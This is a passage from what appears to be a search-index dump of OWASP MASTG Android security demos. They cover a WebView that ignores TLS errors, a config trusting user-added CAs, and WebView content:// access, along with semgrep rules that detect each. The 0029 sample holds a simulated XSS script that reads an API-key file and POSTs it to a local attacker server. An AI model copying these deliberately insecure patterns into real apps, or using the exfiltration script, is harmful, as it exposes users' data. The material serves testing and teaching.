name.</p>","tags":["android","demo","MSTG-TEST-0283"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0056/MASTG-DEMO-0056/","title":"MASTG-DEMO-0056: WebView Ignoring TLS Errors in onReceivedSslError","text":"<p>  Download MASTG-DEMO-0056 APK   Open MASTG-DEMO-0056 Folder  Build MASTG-DEMO-0056 APK</p>","tags":["android","demo","MSTG-TEST-0284"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0056/MASTG-DEMO-0056/#sample","title":"Sample","text":"<p>This sample connects to https://tlsexpired.no, which has an expired SSL certificate, and demonstrates how a WebView ignores SSL/TLS errors by overriding the <code>onReceivedSslError(...)</code> method without proper validation. The app calls <code>proceed()</code> unconditionally, which allows the connection to continue even when there are TLS errors.</p> MastgTestWebView.ktMastgTestWebView_reversed.java <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.net.http.SslError\nimport android.util.Log\nimport android.webkit.SslErrorHandler\nimport android.webkit.WebView\nimport android.webkit.WebViewClient\n\nclass MastgTestWebView(private val context: Context) {\n\n    fun mastgTest(webView: WebView) {\n        webView.apply {\n            webViewClient = object : WebViewClient() {\n                override fun onReceivedSslError(\n                    view: WebView,\n                    handler: SslErrorHandler,\n                    error: SslError\n                ) {\n                    val message = getSslErrorMessage(error)\n\n                    Log.e(\"MastgTestWebView\", \"SSL errors onReceivedSslError: $message\")\n                    Log.e(\"MastgTestWebView\", error.toString())\n\n                    handler.proceed()\n                }\n            }\n            loadUrl(\"https://tlsexpired.no\")\n        }\n    }\n\n    private fun getSslErrorMessage(error: SslError): String = when (error.primaryError) {\n        SslError.SSL_UNTRUSTED      -&gt; \"The certificate authority is not trusted.\"\n        SslError.SSL_EXPIRED        -&gt; \"The certificate has expired.\"\n        SslError.SSL_IDMISMATCH     -&gt; \"The certificate Hostname mismatch.\"\n        SslError.SSL_NOTYETVALID    -&gt; \"The certificate is not yet valid.\"\n        SslError.SSL_DATE_INVALID   -&gt; \"The date of the certificate is invalid.\"\n        else                        -&gt; \"SSL Certificate error.\"\n    }\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.content.Context;\nimport android.net.http.SslError;\nimport android.util.Log;\nimport android.webkit.SslErrorHandler;\nimport android.webkit.WebView;\nimport android.webkit.WebViewClient;\nimport kotlin.Metadata;\nimport kotlin.jvm.internal.Intrinsics;\n\n/* compiled from: MastgTestWebView.kt */\n@Metadata(d1 = {\"\\u0000*\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0003\\n\\u0002\\u0010\\u0002\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0000\\n\\u0002\\u0010\\u000e\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0000\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\u000f\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0004\\b\\u0004\\u0010\\u0005J\\u000e\\u0010\\u0006\\u001a\\u00020\\u00072\\u0006\\u0010\\b\\u001a\\u00020\\tJ\\u0010\\u0010\\n\\u001a\\u00020\\u000b2\\u0006\\u0010\\f\\u001a\\u00020\\rH\\u0002R\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\u000e\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTestWebView;\", \"\", \"context\", \"Landroid/content/Context;\", \"&lt;init&gt;\", \"(Landroid/content/Context;)V\", \"mastgTest\", \"\", \"webView\", \"Landroid/webkit/WebView;\", \"getSslErrorMessage\", \"\", \"error\", \"Landroid/net/http/SslError;\", \"app_debug\"}, k = 1, mv = {2, 0, 0}, xi = 48)\n/* loaded from: classes3.dex */\npublic final class MastgTestWebView {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTestWebView(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final void mastgTest(WebView webView) {\n        Intrinsics.checkNotNullParameter(webView, \"webView\");\n        webView.setWebViewClient(new WebViewClient() { // from class: org.owasp.mastestapp.MastgTestWebView$mastgTest$1$1\n            @Override // android.webkit.WebViewClient\n            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {\n                Intrinsics.checkNotNullParameter(view, \"view\");\n                Intrinsics.checkNotNullParameter(handler, \"handler\");\n                Intrinsics.checkNotNullParameter(error, \"error\");\n                String message = this.this$0.getSslErrorMessage(error);\n                Log.e(\"MastgTestWebView\", \"SSL errors onReceivedSslError: \" + message);\n                Log.e(\"MastgTestWebView\", error.toString());\n                handler.proceed();\n            }\n        });\n        webView.loadUrl(\"https://tlsexpired.no\");\n    }\n\n    /* JADX INFO: Access modifiers changed from: private */\n    public final String getSslErrorMessage(SslError error) {\n        switch (error.getPrimaryError()) {\n            case 0:\n                return \"The certificate is not yet valid.\";\n            case 1:\n                return \"The certificate has expired.\";\n            case 2:\n                return \"The certificate Hostname mismatch.\";\n            case 3:\n                return \"The certificate authority is not trusted.\";\n            case 4:\n                return \"The date of the certificate is invalid.\";\n            default:\n                return \"SSL Certificate error.\";\n        }\n    }\n}\n</code></pre>","tags":["android","demo","MSTG-TEST-0284"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0056/MASTG-DEMO-0056/#steps","title":"Steps","text":"<p>Let's run our  semgrep rule against the sample code.</p> ../../../../rules/mastg-android-network-onreceivedsslerror.yml<pre><code>rules:\n  - id: mastg-android-network-onreceivedsslerror\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rule looks for the use of onReceivedSslError and ensures it throws an exception instead of silently muting TLS errors.\n    message: Improper use of onReceivedSslError handler\n    match:\n      any:\n        - public void onReceivedSslError(...) {...}\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-network-onreceivedsslerror.yml ./MastgTestWebView_reversed.java --text --max-lines-per-finding 15 &gt; output.txt\n</code></pre>","tags":["android","demo","MSTG-TEST-0284"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0056/MASTG-DEMO-0056/#observation","title":"Observation","text":"<p>The rule identified one instance of the use of the <code>onReceivedSslError(...)</code> in the code.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 1 Code Finding \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTestWebView_reversed.java\n    \u276f\u2771 rules.mastg-android-network-onreceivedsslerror\n          Improper use of onReceivedSslError handler\n\n           27\u2506 @Override // android.webkit.WebViewClient\n           28\u2506 public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {\n           29\u2506     Intrinsics.checkNotNullParameter(view, \"view\");\n           30\u2506     Intrinsics.checkNotNullParameter(handler, \"handler\");\n           31\u2506     Intrinsics.checkNotNullParameter(error, \"error\");\n           32\u2506     String message = this.this$0.getSslErrorMessage(error);\n           33\u2506     Log.e(\"MastgTestWebView\", \"SSL errors onReceivedSslError: \" + message);\n           34\u2506     Log.e(\"MastgTestWebView\", error.toString());\n           35\u2506     handler.proceed();\n           36\u2506 }\n</code></pre>","tags":["android","demo","MSTG-TEST-0284"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0056/MASTG-DEMO-0056/#evaluation","title":"Evaluation","text":"<p>The test fails because the app uses a WebView that calls <code>proceed()</code> in its <code>onReceivedSslError(...)</code> method without validating the TLS error at all. You can manually validate this in the app's reverse-engineered code by inspecting the provided code locations.</p> <p>In this case:</p> <pre><code>            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {\n                ...\n                String message = this.this$0.getSslErrorMessage(error);\n                Log.e(\"MastgTestWebView\", \"SSL errors onReceivedSslError: \" + message);\n                Log.e(\"MastgTestWebView\", error.toString());\n                handler.proceed();\n            }\n</code></pre> <p>By doing this, the app is effectively ignoring every TLS error even though we can see that the expired certificate error is logged (see  Monitoring System Logs):</p> logcat.txt<pre><code>[ERROR:ssl_client_socket_impl.cc(877)] handshake failed; returned -1, SSL error code 1, net_error -201\nSSL errors onReceivedSslError: The date of the certificate is invalid.\nprimary error: 4 certificate: Issued to: OU=Insubordinate,O=Insecure CA,1.2.840.113549.1.9.1=#161a696e73656375726540746c737265766f636174696f6e2e6f7267,C=NO,ST=Buskerud,CN=tlsexpired.no;\nIssued by: 1.2.840.113549.1.9.1=#16126a6f68616e4073796473657465722e636f6d,CN=sydseter.com,OU=Sydseter,O=Sydseter,L=Drammen,ST=Drammen,C=NO;\n on URL: https://tlsexpired.no/\n</code></pre>","tags":["android","demo","MSTG-TEST-0284"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0057/MASTG-DEMO-0057/","title":"MASTG-DEMO-0057: Network Security Configuration Allows User-Added Certificates","text":"<p>  Download MASTG-DEMO-0057 APK   Open MASTG-DEMO-0057 Folder  Build MASTG-DEMO-0057 APK</p>","tags":["android","demo","MSTG-TEST-0286"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0057/MASTG-DEMO-0057/#sample","title":"Sample","text":"<p>This sample Kotlin code fetches the  badssl server https://mitm-software.badssl.com/ using <code>HttpsURLConnection</code>, which is not normally allowed because the certificate is not trusted by the system. However, due to the Network Security Configuration that permits user-added CA certificates, the connection is allowed to proceed.</p> MastgTest.ktAndroidManifest.xmlAndroidManifest_reversed.xmlnetwork_security_config.xml <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport java.net.URL\nimport javax.net.ssl.HttpsURLConnection\n\nclass MastgTest(private val context: Context) {\n\n    fun mastgTest(): String {\n        val content = StringBuilder(\"Response:\\n\\n\")\n        val thread = Thread {\n            content.append(fetchUrl(\"https://mitm-software.badssl.com/\"))\n        }\n        thread.start()\n        thread.join()\n        return content.toString()\n    }\n\n    private fun fetchUrl(urlString: String): String {\n        return try {\n            val url = URL(urlString)\n            val connection = url.openConnection() as HttpsURLConnection\n\n            connection.setRequestProperty(\"User-Agent\", \"OWASP MAS APP 9000\")\n            connection.connect()\n\n            val response = connection.inputStream.bufferedReader().use { it.readText() }\n            \"\\n[$urlString] Response OK\\n$response\\n\"\n        } catch (e: Exception) {\n            \"\\n[$urlString] Error: ${e.message}\\n\"\n        }\n    }\n\n}\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"&gt;\n    &lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt;\n    &lt;application\n        android:allowBackup=\"true\"\n        android:networkSecurityConfig=\"@xml/network_security_config\"\n        android:dataExtractionRules=\"@xml/data_extraction_rules\"\n        android:fullBackupContent=\"@xml/backup_rules\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:label=\"@string/app_name\"\n        android:roundIcon=\"@mipmap/ic_launcher_round\"\n        android:supportsRtl=\"true\"\n        android:theme=\"@style/Theme.MASTestApp\"\n        tools:targetApi=\"31\"&gt;\n        &lt;activity\n            android:name=\".MainActivity\"\n            android:exported=\"true\"\n            android:theme=\"@style/Theme.MASTestApp\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n                &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n    &lt;/application&gt;\n&lt;/manifest&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    android:versionCode=\"1\"\n    android:versionName=\"1.0\"\n    android:compileSdkVersion=\"35\"\n    android:compileSdkVersionCodename=\"15\"\n    package=\"org.owasp.mastestapp\"\n    platformBuildVersionCode=\"35\"\n    platformBuildVersionName=\"15\"&gt;\n    &lt;uses-sdk\n        android:minSdkVersion=\"29\"\n        android:targetSdkVersion=\"35\"/&gt;\n    &lt;uses-permission android:name=\"android.permission.INTERNET\"/&gt;\n    &lt;permission\n        android:name=\"org.owasp.mastestapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION\"\n        android:protectionLevel=\"signature\"/&gt;\n    &lt;uses-permission android:name=\"org.owasp.mastestapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION\"/&gt;\n    &lt;application\n        android:theme=\"@style/Theme.MASTestApp\"\n        android:label=\"@string/app_name\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:debuggable=\"true\"\n        android:testOnly=\"true\"\n        android:allowBackup=\"true\"\n        android:supportsRtl=\"true\"\n        android:extractNativeLibs=\"false\"\n        android:fullBackupContent=\"@xml/backup_rules\"\n        android:networkSecurityConfig=\"@xml/network_security_config\"\n        android:roundIcon=\"@mipmap/ic_launcher_round\"\n        android:appComponentFactory=\"androidx.core.app.CoreComponentFactory\"\n        android:dataExtractionRules=\"@xml/data_extraction_rules\"&gt;\n        &lt;activity\n            android:theme=\"@style/Theme.MASTestApp\"\n            android:name=\"org.owasp.mastestapp.MainActivity\"\n            android:exported=\"true\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\"/&gt;\n                &lt;category android:name=\"android.intent.category.LAUNCHER\"/&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n        &lt;activity\n            android:name=\"androidx.compose.ui.tooling.PreviewActivity\"\n            android:exported=\"true\"/&gt;\n        &lt;activity\n            android:name=\"androidx.activity.ComponentActivity\"\n            android:exported=\"true\"/&gt;\n        &lt;provider\n            android:name=\"androidx.startup.InitializationProvider\"\n            android:exported=\"false\"\n            android:authorities=\"org.owasp.mastestapp.androidx-startup\"&gt;\n            &lt;meta-data\n                android:name=\"androidx.emoji2.text.EmojiCompatInitializer\"\n                android:value=\"androidx.startup\"/&gt;\n            &lt;meta-data\n                android:name=\"androidx.lifecycle.ProcessLifecycleInitializer\"\n                android:value=\"androidx.startup\"/&gt;\n            &lt;meta-data\n                android:name=\"androidx.profileinstaller.ProfileInstallerInitializer\"\n                android:value=\"androidx.startup\"/&gt;\n        &lt;/provider&gt;\n        &lt;receiver\n            android:name=\"androidx.profileinstaller.ProfileInstallReceiver\"\n            android:permission=\"android.permission.DUMP\"\n            android:enabled=\"true\"\n            android:exported=\"true\"\n            android:directBootAware=\"false\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.INSTALL_PROFILE\"/&gt;\n            &lt;/intent-filter&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.SKIP_FILE\"/&gt;\n            &lt;/intent-filter&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.SAVE_PROFILE\"/&gt;\n            &lt;/intent-filter&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"androidx.profileinstaller.action.BENCHMARK_OPERATION\"/&gt;\n            &lt;/intent-filter&gt;\n        &lt;/receiver&gt;\n    &lt;/application&gt;\n&lt;/manifest&gt;\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;network-security-config&gt;\n    &lt;base-config&gt;\n        &lt;trust-anchors&gt;\n            &lt;certificates src=\"system\" /&gt;\n            &lt;certificates src=\"user\" /&gt;\n        &lt;/trust-anchors&gt;\n    &lt;/base-config&gt;\n&lt;/network-security-config&gt;\n</code></pre> <p>Running the app</p> <p>You don't need to run the app on a device or emulator to test this demo because it focuses on the Network Security Configuration. However, if you want to run the app and verify that the connection is allowed, some additional preparation is required:</p> <ol> <li>Obtain the root CA certificate for the server. For this example, obtain it  here: https://github.com/chromium/badssl.com/blob/master/certs/src/crt/ca-mitm-software.crt</li> <li>Copy the certificate file onto the device or emulator. For example, use the command <code>adb push ca-mitm-software.crt /sdcard/Download/</code>.</li> <li>On the device open Settings &gt; Security &gt; Encryption &amp; credentials &gt; Install from storage and select your certificate file. Confirm it installs under \"User credentials\".</li> </ol>","tags":["android","demo","MSTG-TEST-0286"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0057/MASTG-DEMO-0057/#steps","title":"Steps","text":"<p>First of all we obtain the AndroidManifest.xml file (<code>AndroidManifest_reversed.xml</code>), which contains the <code>android:networkSecurityConfig</code> attribute pointing to the app's Network Security Configuration file (<code>network_security_config.xml</code>).</p> <p>Let's run our  semgrep rule against the sample code.</p> ../../../../rules/mastg-android-network-insecure-trust-anchors.yml<pre><code>rules:\n  - id: mastg-android-network-insecure-trust-anchors\n    severity: WARNING\n    languages:\n      - xml\n    metadata:\n      summary: Detects entries in network security config that allow user-added CAs.\n    message: The network security config allows certificates imported on the user's behalf thereby allowing connections to potentially insecure CAs\n    match:\n      any:\n        - &lt;certificates src=\"user\"\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-network-insecure-trust-anchors.yml ./network_security_config.xml --text &gt; output.txt\n</code></pre>","tags":["android","demo","MSTG-TEST-0286"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0057/MASTG-DEMO-0057/#observation","title":"Observation","text":"<p>The rule has identified an element in the Network Security Configuration that allows user-added CA certificates.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 1 Code Finding \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    network_security_config.xml\n    \u276f\u2771 rules.mastg-android-network-insecure-trust-anchors\n          The network security config allows certificates imported on the user's behalf thereby allowing\n          connections to potentially insecure CAs                                                       \n\n            6\u2506 &lt;certificates src=\"user\" /&gt;\n</code></pre>","tags":["android","demo","MSTG-TEST-0286"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0057/MASTG-DEMO-0057/#evaluation","title":"Evaluation","text":"<p>The test fails due to the <code>&lt;certificates src=\"user\" /&gt;</code> element in the Network Security Configuration which allows user-added CA certificates.</p>","tags":["android","demo","MSTG-TEST-0286"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0029/MASTG-DEMO-0029/","title":"MASTG-DEMO-0029: Uses of WebViews Allowing Content Access with semgrep","text":"<p>  Download MASTG-DEMO-0029 APK   Open MASTG-DEMO-0029 Folder  Build MASTG-DEMO-0029 APK</p>","tags":["android","demo","MASTG-TEST-0250"]},{"location":"MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0029/MASTG-DEMO-0029/#sample","title":"Sample","text":"<p>This sample demonstrates how a WebView in an Android app, when configured to allow content access, can be exploited by an attacker to interact with exposed <code>content://</code> URIs. While <code>content://</code> URIs are simply interfaces to content providers, a misconfigured or overly permissive content provider may grant access to sensitive resources\u2014such as internal app files. In this example, internal file access is used as a representative impact to illustrate the full attack chain, though actual impacts depend on the specific behavior of the content provider.</p> <p>In this demo we focus on the static analysis of the code using semgrep and don't run the app nor the attacker server.</p> <p>See  Uses of WebViews Allowing Content Access with Frida for all the details about the sample and the attack.</p> MastgTestWebView.ktMastgTestWebView_reversed.javaAndroidManifest.xmlAndroidManifest_reversed.xmlfilepaths.xml <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.webkit.WebView\nimport java.io.*\n\n/**\n * This class writes a sensitive file (\"api-key.txt\") into internal storage and then loads a vulnerable\n * page into a WebView. That page simulates an XSS injection:\n * an attacker's script (running in the context of the vulnerable page) makes an `XMLHttpRequest` to\n * read the sensitive file via the content provider and then uses `fetch` to send the content to an external server.\n *\n * By loading the page with a `file://` base URL and enabling universal access from file URLs,\n * we relax the default restriction (which would otherwise treat `content://` requests as opaque origin)\n * and allow the `XMLHttpRequest` to succeed.\n */\nclass MastgTestWebView(private val context: Context) {\n\n    fun mastgTest(webView: WebView) {\n        // Write a sensitive file (for example, cached credentials or private data).\n        val sensitiveFile = File(context.filesDir, \"api-key.txt\")\n        sensitiveFile.writeText(\"MASTG_API_KEY=072037ab-1b7b-4b3b-8b7b-1b7b4b3b8b7b\")\n\n        // Configure the WebView.\n        webView.settings.apply {\n            /* `javaScriptEnabled` is required for the attacker's script to even execute.\n             * This is very common in WebViews, unless they only load static content.\n            */\n            javaScriptEnabled = true\n\n            /* `allowUniversalAccessFromFileURLs` is required in this attack since it\n             * relaxes the default restrictions so that pages loaded from file:// can access\n             * content from any origin (including content:// URIs).\n             *\n             * If this is not set, the following error will be logged in logcat:\n             *\n             *   [INFO:CONSOLE(0)] \"Access to XMLHttpRequest at 'content://org.owasp.mastestapp.provider/sensitive.txt'\n             *   from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported\n             *   for protocol schemes: http, data, chrome, https, chrome-untrusted.\", source: file:/// (0)\n             *\n             * Note that the fetch to the external server will still work, but the retrieval of the file content via content:// will fail.\n            */\n            allowUniversalAccessFromFileURLs = true\n\n\n            /* `allowContentAccess` is intentionally not set to false to showcase the default behavior.\n             * If we were to disable content provider access,\n             * this would prevent the attacker's script from accessing the sensitive file via the content provider.\n             */\n            // allowContentAccess = false\n\n        }\n\n        // Vulnerable HTML simulating an XSS injection.\n        // The attacker-injected script uses XMLHttpRequest to load the sensitive file from the content provider.\n        val vulnerableHtml = \"\"\"\n            &lt;html&gt;\n              &lt;head&gt;\n                &lt;meta charset=\"utf-8\"&gt;\n                &lt;title&gt;MASTG-DEMO-0029&lt;/title&gt;\n              &lt;/head&gt;\n              &lt;body&gt;\n                &lt;h1&gt;MASTG-DEMO-0029&lt;/h1&gt;\n                &lt;p&gt;This HTML page is vulnerable to XSS. An attacker was able to inject JavaScript to exfiltrate data from the app internal storage using content:// URIs.&lt;/p&gt;\n                &lt;p&gt;The file is located in /data/data/org.owasp.mastestapp/files/&lt;/p&gt;\n                &lt;p&gt;NOTE: For demo purposes we display the exfiltrated data on screen. However, the user wouldn't even notice as the data is exfiltrated silently.&lt;/p&gt;\n                &lt;script type=\"text/javascript\"&gt;\n                  function exfiltrate(data) {\n\n                    var output = document.createElement(\"div\");\n                    output.style.color = \"white\";\n                    output.style.borderRadius = \"5px\";\n                    output.style.backgroundColor = \"red\";\n                    output.style.padding = \"1em\";\n                    output.style.marginTop = \"1em\";\n                    output.innerHTML = \"&lt;strong&gt;Exfiltrated Data:&lt;/strong&gt;&lt;br&gt;\" + data;\n                    document.body.appendChild(output);\n\n                    // Send the text file content to the external server\n                    fetch('http://10.0.2.2:5001/receive', {\n                        method: 'POST',\n                        headers: {\n                            'Content-Type': 'text/plain'\n                        },\n                        body: data\n                    })\n                    .then(response =&gt; console.log('File content sent successfully.'))\n                    .catch(err =&gt; console.error('Error sending file content:', err));\n                  }\n                  function readSensitiveFile() {\n                    var xhr = new XMLHttpRequest();\n                    xhr.onreadystatechange = function() {\n                      if (xhr.readyState === 4) {\n                        if (xhr.status === 200) {\n                          exfiltrate(xhr.responseText);\n                        } else {\n                          exfiltrate(\"Error reading file: \" + xhr.status);\n                        }\n                      }\n                    };\n                    // The injected script accesses the sensitive file via the content provider.\n                    xhr.open(\"GET\", \"content://org.owasp.mastestapp.fileprovider/internal_files/api-key.txt\", true);\n                    xhr.send();\n                  }\n                  // Simulate the injected payload triggering.\n                  readSensitiveFile();\n                &lt;/script&gt;\n              &lt;/body&gt;\n            &lt;/html&gt;\n        \"\"\".trimIndent()\n\n\n        // Load the vulnerable HTML.\n        // Using a base URL with the file:// scheme gives the page a non\u2011opaque origin (using content:/// works the same way).\n        webView.loadDataWithBaseURL(\n            \"file:///\",\n            vulnerableHtml,\n            \"text/html\",\n            \"UTF-8\",\n            null\n        )\n    }\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.content.Context;\nimport android.webkit.WebSettings;\nimport android.webkit.WebView;\nimport java.io.File;\nimport kotlin.Metadata;\nimport kotlin.io.FilesKt;\nimport kotlin.jvm.internal.Intrinsics;\n\n/* compiled from: MastgTestWebView.kt */\n@Metadata(d1 = {\"\\u0000\\u001e\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0002\\n\\u0002\\u0010\\u0002\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0000\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\r\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0002\\u0010\\u0004J\\u000e\\u0010\\u0005\\u001a\\u00020\\u00062\\u0006\\u0010\\u0007\\u001a\\u00020\\bR\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\t\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTestWebView;\", \"\", \"context\", \"Landroid/content/Context;\", \"(Landroid/content/Context;)V\", \"mastgTest\", \"\", \"webView\", \"Landroid/webkit/WebView;\", \"app_debug\"}, k = 1, mv = {1, 9, 0}, xi = 48)\n/* loaded from: classes4.dex */\npublic final class MastgTestWebView {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTestWebView(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final void mastgTest(WebView webView) {\n        Intrinsics.checkNotNullParameter(webView, \"webView\");\n        File sensitiveFile = new File(this.context.getFilesDir(), \"api-key.txt\");\n        FilesKt.writeText$default(sensitiveFile, \"MASTG_API_KEY=072037ab-1b7b-4b3b-8b7b-1b7b4b3b8b7b\", null, 2, null);\n        WebSettings $this$mastgTest_u24lambda_u240 = webView.getSettings();\n        $this$mastgTest_u24lambda_u240.setJavaScriptEnabled(true);\n        $this$mastgTest_u24lambda_u240.setAllowUniversalAccessFromFileURLs(true);\n        webView.loadDataWithBaseURL(\"file:///\", \"&lt;html&gt;\\n  &lt;head&gt;\\n    &lt;meta charset=\\\"utf-8\\\"&gt;\\n    &lt;title&gt;MASTG-DEMO-0029&lt;/title&gt;\\n  &lt;/head&gt;\\n  &lt;body&gt;\\n    &lt;h1&gt;MASTG-DEMO-0029&lt;/h1&gt;\\n    &lt;p&gt;This HTML page is vulnerable to XSS. An attacker was able to inject JavaScript to exfiltrate data from the app internal storage using content:// URIs.&lt;/p&gt;\\n    &lt;p&gt;The file is located in /data/data/org.owasp.mastestapp/files/&lt;/p&gt;\\n    &lt;p&gt;NOTE: For demo purposes we display the exfiltrated data on screen. However, the user wouldn't even notice as the data is exfiltrated silently.&lt;/p&gt;\\n    &lt;script type=\\\"text/javascript\\\"&gt;\\n      function exfiltrate(data) {\\n        \\n        var output = document.createElement(\\\"div\\\");\\n        output.style.color = \\\"white\\\";\\n        output.style.borderRadius = \\\"5px\\\";\\n        output.style.backgroundColor = \\\"red\\\";\\n        output.style.padding = \\\"1em\\\";\\n        output.style.marginTop = \\\"1em\\\";\\n        output.innerHTML = \\\"&lt;strong&gt;Exfiltrated Data:&lt;/strong&gt;&lt;br&gt;\\\" + data;\\n        document.body.appendChild(output);\\n                \\n        // Send the text file content to the external server\\n        fetch('http://10.0.2.2:5001/receive', {\\n            method: 'POST',\\n            headers: {\\n                'Content-Type': 'text/plain'\\n            },\\n            body: data\\n        })\\n        .then(response =&gt; console.log('File content sent successfully.'))\\n        .catch(err =&gt; console.error('Error sending file content:', err));\\n      }\\n      function readSensitiveFile() {\\n        var xhr = new XMLHttpRequest();\\n        xhr.onreadystatechange = function() {\\n          if (xhr.readyState === 4) {\\n            if (xhr.status === 200) {\\n              exfiltrate(xhr.responseText);\\n            } else {\\n              exfiltrate(\\\"Error reading file: \\\" + xhr.status);\\n            }\\n          }\\n        };\\n        // The injected script accesses the sensitive file via the content provider.\\n        xhr.open(\\\"GET\\\", \\\"content://org.owasp.mastestapp.fileprovider/internal_files/api-key.txt\\\", true);\\n        xhr.send();\\n      }\\n      // Simulate the injected payload triggering.\\n      readSensitiveFile();\\n    &lt;/script&gt;\\n  &lt;/body&gt;\\n&lt;/html&gt;\", \"text/html\", \"UTF-8\", null);\n    }\n}\n</code></pre> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"&gt;\n\n    &lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt;\n\n    &lt;application\n        android:allowBackup=\"true\"\n        android:usesCleartextTraffic=\"true\"\n        android:dataExtractionRules=\"@xml/data_extraction_rules\"\n        android:fullBackupContent=\"@xml/backup_rules\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:label=\"@string/app_name\"\n        android:roundIcon=\"@mipmap/ic_launcher_round\"\n        android:supportsRtl=\"true\"\n        android:theme=\"@style/Theme.MASTestApp\"\n        tools:targetApi=\"31\"&gt;\n        &lt;activity\n            android:name=\".MainActivityWebView\"\n            android:exported=\"true\"\n            android:theme=\"@style/Theme.MASTestApp\"&gt;\n            &lt;intent-filter&gt;\n                &lt;action android:name=\"android.intent.action.MAIN\" /&gt;\n\n                &lt;category android:name=\"android.intent.category.LAUNCHER\" /&gt;\n            &lt;/intent-filter&gt;\n        &lt;/activity&gt;\n        &lt;provider\n            android:name=\"androidx.core.content.FileProvider\"\n            